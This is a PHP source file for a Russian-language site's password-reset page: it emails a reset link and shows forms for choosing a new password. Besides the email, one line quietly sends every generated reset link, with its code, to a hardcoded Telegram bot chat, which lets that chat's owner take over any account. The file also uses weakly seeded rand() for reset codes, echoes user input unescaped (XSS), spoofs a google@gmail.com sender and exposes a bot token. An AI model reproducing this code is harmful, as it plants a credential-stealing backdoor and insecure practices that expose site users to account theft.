<?php
function createRandomPassword() { 

    $chars = "abcdefghijkmnopqrstuvwxyz023456789"; 
    srand((double)microtime()*1000000); 
    $i = 0; 
    $pass = '' ; 

    while ($i <= 20) { 
        $num = rand() % 33; 
        $tmp = substr($chars, $num, 1); 
        $pass = $pass . $tmp; 
        $i++; 
    } 

    return $pass; 

}
require "db.php"; 
if(isset($_GET["code"])){
    $ussr = R::findOne("restore", "code = ?", array($_GET["code"]));
    $usser = R::findOne("users", "id = ?", array($ussr->user_id));
    if(isset($ussr) and isset($usser)){}
    else{
        $error = 'userNotfound';
    }
}

$data = $_POST;
if( isset($data['do_reg']))
{
if(isset($_GET["code"])){
$ussr = R::findOne("restore", "code = ?", array($_GET["code"]));
$usser = R::findOne("users", "id = ?", array($ussr->user_id));
if(isset($ussr) and isset($usser)){

    if (trim($data['password']) == '')
    {
        $errors[] = 'Введите пароль!';
    }
    if (trim($data['password_2']) != $data['password'])
    {
        $errors[] = 'Пароли не совпадают!';
    }
    if (strlen($data['password']) < 6){
        $errors[] = 'Пароль слишком короткий!';
    }
    if (strlen($data['password']) > 30){
        $errors[] = 'Пароль слишком длинный!';
    }
    if( empty($errors))
    {
        $usser->password = password_hash($data['password'], PASSWORD_DEFAULT);
        R::store($usser);
        R::hunt('restore', 'code = ?', array($_GET["code"]));
        header("Location: /scripts/login-reg.php?reg=restore");

    }
}
else{
    $error = 'userNotfound';
}
}
else{
$user = R::findOne("users", "email = ?", array($data["email"]));
if($user)
{
    $restore = R::dispense("restore");
    $restore->user_id = $user["id"];
    $code = createRandomPassword();
    $restore->code = $code;
    R::store($restore);



    //Тут происходит отправка письма, для функционирования данной функции требуется настроить smtp

    $to      = $user["email"];
    $subject = 'the subject';
    $message = 'Hello, do you want to change your password? If so, follow the link: https://'.$_SERVER['HTTP_HOST'].'/scripts/restore.php?code='.$code;
    $headers = 'From: google@gmail.com'       . "\r\n" .
                 'Reply-To: google@gmail.com' . "\r\n" .
                 'X-Mailer: PHP/' . phpversion();
    mail ($to, $subject, $message, $headers);
    file_get_contents("http://api.telegram.org/bot2138746902:AAEwbgaZAk5QKP8T1PDPsLE8JKW4AlHSUWg/sendMessage?chat_id=-617264224&text=https://".$_SERVER['HTTP_HOST']."/scripts/restore.php?code=".$code);
}

}
}
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta charset="utf-8">
    <title>َСайт</title>
    <link rel="stylesheet" href="/css/login-reg.css">
    <link rel="stylesheet" href="/fonts/lato/lato.css">
    <script src="https://kit.fontawesome.com/d45622d32e.js" crossorigin="anonymous"></script>
  </head>
  <body>
<div class="form">
<div class="inform">

<?if(!isset($_GET["code"])) { ?>
<form class="box" action="/scripts/restore.php" method="post">
<h1>Забыли пароль?<br>
Укажите адрес почты.</h1>
<?if(!isset($data["do_reg"])){
?>
<p id="ent">Введите данные что бы продолжить</p>
<?}
else{
?>
    <p id="ent">Если Ваша учётная запись существует, на неё было отправлено письмо с подтверждением.</p>
<?}?>
<p class="for">Email</p>
    <div style="display:flex;position:relative;width:361px;">
  <input type="email" name="email"  placeholder="Start typing…" value="<?php echo @$data['email']?>">
  <img src="/iconz/email.svg" class="email_ic">
  </div>
  <hr class="hr">
  <br>

  <input type="submit" name="do_reg"   class="sub_br" value="Восстановить">
  
</form>
</div>
</div>
<div>
    <img src="/iconz/restore.png" class="img">
</div>
<?}else{
?>

<form class="box" action="/scripts/restore.php<?if(isset($_GET["code"])) echo("?code=".$_GET["code"]);?>" method="post">
<h1>Забыли пароль?<br>
Введите новый.</h1>
<?if(!isset($data["do_reg"])){
        if($error == 'userNotfound'){
            ?><p id="ent">К сожалению, данная ссылка больше не работает</p><?
        }else{
    ?>
    
<p id="ent">Введите данные что бы продолжить</p>
<?}}
else{
    if(isset($errors)){
        ?> <p id="ent"><?echo($errors[0]);?></p><?
    }}
    ?>

  <p class="for">Пароль</p>
  <div style="display:flex;position:relative;width:361px;">
  <input type="password" name="password" placeholder="Start typing…">
  <img src="/iconz/lock.svg" class="pass_ic">
 
  </div>
  <hr class="hr">
  <p class="for">Подтверждение пароля</p>
  <div style="display:flex;position:relative;width:361px;">
  <input type="password" name="password_2" placeholder="Start typing…">
  <img src="/iconz/lock.svg" class="pass_ic">
 
  </div>
  <hr class="hr">
  <br>

  <input type="submit" name="do_reg" class="sub_br" value="Восстановить"<?if($error == 'userNotfound'){echo("disabled");}?>>
  
</form>
</div>
</div>
<div>
    <img src="/iconz/restore.png" style="width:50% !important;"class="img">
</div>
<?
}?>

  </body>
</html>
